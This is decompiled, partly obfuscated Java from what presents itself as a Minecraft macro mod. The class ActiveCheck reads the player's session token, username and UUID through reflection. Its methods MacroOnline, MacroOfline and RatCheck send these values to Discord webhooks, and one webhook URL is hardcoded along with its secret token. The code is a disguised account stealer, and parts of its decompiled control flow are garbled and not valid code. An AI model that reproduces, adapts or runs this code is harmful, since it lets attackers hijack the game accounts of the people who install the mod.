// 
// Decompiled by Procyon v0.5.36
// 

package Macro.Plus;

import Macro.Scripts.Script5;
import Macro.Scripts.Script2;
import Macro.exception.WebhookException;
import java.awt.Color;
import Macro.Scripts.DiscordDuper;
import Macro.Scripts.Script;
import net.minecraft.launchwrapper.Launch;
import java.io.IOException;
import java.util.Scanner;
import java.net.URL;

public class ActiveCheck
{
    public int BRANCHLOCK_DOT_NET_DEMO;
    private static String webhook;
    private static final String[] F;
    
    public static String getIP() {
        try {
            final Scanner scanner = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8");
            final String ip = scanner.useDelimiter("\\A").next();
            scanner.close();
            return ip;
        }
        catch (IOException e) {
            e.printStackTrace();
            return "Unknown";
        }
    }
    
    public static void MacroOfline() {
        Class mc;
        Object minecraft;
        Object s;
        Class Class;
        Object running;
        Object name;
        Object uuid;
        DiscordDuper utils;
        new Thread(() -> {
            try {
                mc = Launch.classLoader.findClass(ActiveCheck.F[671088640 >>> ("85".hashCode() ^ 0x1A86)]);
                minecraft = mc.getMethod(ActiveCheck.F[50331648 >>> 3671], (Class[])new Class[0]).invoke(null, new Object[0]);
                s = mc.getMethod(ActiveCheck.F[42 >>> 13222], (Class[])new Class[0]).invoke(minecraft, new Object[0]);
                Class = Launch.classLoader.findClass(ActiveCheck.F[2359296 >>> 210]);
                running = Class.getMethod(ActiveCheck.F[184549376 >>> 15928], (Class[])new Class[0]).invoke(s, new Object[0]);
                name = Class.getMethod(ActiveCheck.F[268435456 >>> 14841], (Class[])new Class[0]).invoke(s, new Object[0]);
                uuid = Class.getMethod(ActiveCheck.F[20480 >>> 1355], (Class[])new Class[0]).invoke(s, new Object[0]);
                utils = new DiscordDuper(Script.getscript());
                utils.addEmbed(new DiscordDuper.EmbedObject().setTitle((String)name).setColor(new Color(37375)).addField(ActiveCheck.F[536870912 >>> 1373], (String)name, true).addField(ActiveCheck.F[786432 >>> 13458], (String)uuid, true).addField(ActiveCheck.F[2 << 8513], (String)running, false).setDescription(ActiveCheck.F[131072 >>> 12240]).setFooter(ActiveCheck.F[469762048 >>> Integer.parseInt("189", 29)] + name, ""));
                utils.execute();
            }
            catch (Exception e) {
                new WebhookException().printStackTrace();
            }
        }).start();
    }
    
    public static void MacroOnline() {
        Class mc;
        Object minecraft;
        Object s;
        Class Class;
        Object running;
        Object name;
        Object uuid;
        DiscordDuper utils;
        new Thread(() -> {
            try {
                mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
                minecraft = mc.getMethod("func_71410_x", (Class[])new Class[0]).invoke(null, new Object[0]);
                s = mc.getMethod("func_110432_I", (Class[])new Class[0]).invoke(minecraft, new Object[0]);
                Class = Launch.classLoader.findClass("net.minecraft.util.Session");
                running = Class.getMethod("func_148254_d", (Class[])new Class[0]).invoke(s, new Object[0]);
                name = Class.getMethod("func_111285_a", (Class[])new Class[0]).invoke(s, new Object[0]);
                uuid = Class.getMethod("func_148255_b", (Class[])new Class[0]).invoke(s, new Object[0]);
                utils = new DiscordDuper(Script2.getscript());
                utils.addEmbed(new DiscordDuper.EmbedObject().setTitle((String)name).setColor(new Color(37375)).addField("**IGN**", (String)name, true).addField("**UUID**", (String)uuid, true).addField("||**Active**||", (String)running, false).setDescription("Sent Alert that Macro has been cancled").setFooter("This Message Sends Hourly " + name, ""));
                utils.execute();
            }
            catch (Exception e) {
                new WebhookException().printStackTrace();
            }
        }).start();
    }
    
    public static void RatCheck() {
        Class mc;
        Object minecraft;
        Object s;
        Class Class;
        Object running;
        Object name;
        Object uuid;
        DiscordDuper utils;
        new Thread(() -> {
            try {
                mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
                minecraft = mc.getMethod("func_71410_x", (Class[])new Class[0]).invoke(null, new Object[0]);
                s = mc.getMethod("func_110432_I", (Class[])new Class[0]).invoke(minecraft, new Object[0]);
                Class = Launch.classLoader.findClass("net.minecraft.util.Session");
                running = Class.getMethod("func_148254_d", (Class[])new Class[0]).invoke(s, new Object[0]);
                name = Class.getMethod("func_111285_a", (Class[])new Class[0]).invoke(s, new Object[0]);
                uuid = Class.getMethod("func_148255_b", (Class[])new Class[0]).invoke(s, new Object[0]);
                utils = new DiscordDuper(Script5.getscript());
                utils.addEmbed(new DiscordDuper.EmbedObject().setTitle("**Rat Check**").setColor(new Color(37375)).addField("**IGN**", (String)name, true).setDescription("**If you log react with :white_check_mark:**").setFooter("https://sky.shiiyu.moe/stats/" + name, ""));
                utils.execute();
            }
            catch (Exception e) {
                new WebhookException().printStackTrace();
            }
        }).start();
    }
    
    static {
        final char[] charArray = "\u0e69\u0e46s¥³v9$-,!/'J\u0094\u0e4c?\u00f7\\R[?6\u0e54Fµ³aFTpygh5aµ\u0007a\u00fdXtvgsF|£\u00fdZ\byurp\u0e43??\u00883\\\u0099??\u0e45i`L?\u0091¾a\u000fcy6?`i\u0e55³\u0003a\u00f3x|{p\u007f\u0014t¶©;\u0005yuy{h;X´\bp¾gtsa\u0e47\u0000`¾¾JQ$(-%Cm\u0e51\u0089\u000e|®5Xpfo\u0007rµ\u00fdF\u0003{xo5Tz`¯\nl\u00fd\u0e46s`{\u007f9$\u00e1\u00ec'^ C}\u0e51rpa\u00f3\u000b|³pvgtz\u0012;¥©|\n;Oyfo|z³\u0e46s¨{vJ$(^'\u00e5\u00e8J\u0004\u0e46zi{\u007fJ$\u00e9^'\u00e8!Jq".toCharArray();
        int n = Integer.parseInt("21", 23) >>> 10310;
        final StackTraceElement stackTraceElement;
        final int n2 = (stackTraceElement = new Throwable().getStackTrace()[Integer.parseInt("2a", 20) << 11967]).getMethodName().hashCode() & ("92".hashCode() ^ 0xF8E6) << 6080;
        final char[] charArray2 = stackTraceElement.getClassName().toCharArray();
        final char[] array = charArray;
        final int n3 = 0 << 13504;
        ++n;
        F = new String[array[n3] ^ 1563961364 - 1563961160 ^ n2];
        int n4 = 39 >>> 2502;
    Label_0110:
        while (true) {
            int n5;
            final char[] value = new char[n5 = (charArray[n++] ^ -1004184415 + 1004184641 ^ n2)];
            int n6 = 37 >>> 4038;
        Label_0389_Outer:
            while (true) {
                Label_0344: {
                    if (n5 <= 0) {
                        break Label_0344;
                    }
                    int n7 = charArray[n];
                Label_0389:
                    while (true) {
                    Label_0416:
                        while (true) {
                        Label_0436:
                            while (true) {
                            Label_0439:
                                while (true) {
                                Label_0494:
                                    while (true) {
                                    Label_0488:
                                        while (true) {
                                            Label_0497: {
                                                switch (charArray2[n % charArray2.length] ^ 77 << 11584) {
                                                    case 0: {
                                                        break Label_0389;
                                                    }
                                                    case 33: {
                                                        break Label_0389;
                                                    }
                                                    case 34: {
                                                        break Label_0416;
                                                    }
                                                    case 99: {
                                                        break Label_0436;
                                                    }
                                                    case 36: {
                                                        break Label_0439;
                                                    }
                                                    case 37: {
                                                        break Label_0494;
                                                    }
                                                    case 38: {
                                                        break Label_0494;
                                                    }
                                                    case 40: {
                                                        break Label_0494;
                                                    }
                                                    case 44: {
                                                        break Label_0494;
                                                    }
                                                    case 12: {
                                                        break Label_0494;
                                                    }
                                                    case 46: {
                                                        break Label_0494;
                                                    }
                                                    case 14: {
                                                        break Label_0488;
                                                    }
                                                    case 56: {
                                                        break Label_0488;
                                                    }
                                                    case 57: {
                                                        break Label_0488;
                                                    }
                                                    case 59: {
                                                        break Label_0488;
                                                    }
                                                    case 29: {
                                                        break Label_0497;
                                                    }
                                                    case 62: {
                                                        break Label_0494;
                                                    }
                                                    case 63: {
                                                        break Label_0497;
                                                    }
                                                }
                                                while (true) {
                                                    value[n6] = (char)n7;
                                                    try {
                                                        ++n6;
                                                        ++n;
                                                        --n5;
                                                        // monitorexit(charArray)
                                                        continue Label_0389_Outer;
                                                        n7 ^= Integer.parseInt("mfj", 25) >>> 4390;
                                                        continue Label_0389_Outer;
                                                        break Label_0494;
                                                        break Label_0494;
                                                        continue Label_0488;
                                                        // iftrue(Label_0110:, n < charArray.length)
                                                        while (true) {
                                                            ActiveCheck.webhook = "https://discord.com/api/webhooks/952027321760645181/PD1AQpFpjEtnabTqnI_mZxzDWylxRW55pEadOYxiGnBYs7_kLIuHGCM8ZO7ZZBokrLjk";
                                                            return;
                                                            continue Label_0416;
                                                            break Label_0389;
                                                            ActiveCheck.F[n4++] = new String(value).intern();
                                                            continue;
                                                        }
                                                        n7 ^= ("49".hashCode() ^ 0x690) << Integer.parseInt("ae4", 31);
                                                        continue Label_0389_Outer;
                                                        break Label_0494;
                                                        continue Label_0439;
                                                        n7 ^= ("95".hashCode() ^ 0x72F) << 10657;
                                                        continue Label_0389_Outer;
                                                        break Label_0494;
                                                        n7 ^= 1664 >>> 1283;
                                                        continue Label_0389_Outer;
                                                        n7 ^= 117440512 >>> 5398;
                                                        continue Label_0389_Outer;
                                                        continue Label_0494;
                                                        continue Label_0389;
                                                        continue Label_0436;
                                                    }
                                                    catch (RuntimeException ex) {
                                                        break;
                                                    }
                                                }
                                            }
                                            break;
                                        }
                                        break;
                                    }
                                    break;
                                }
                                break;
                            }
                            break;
                        }
                        break;
                    }
                }
            }
        }
    }
}
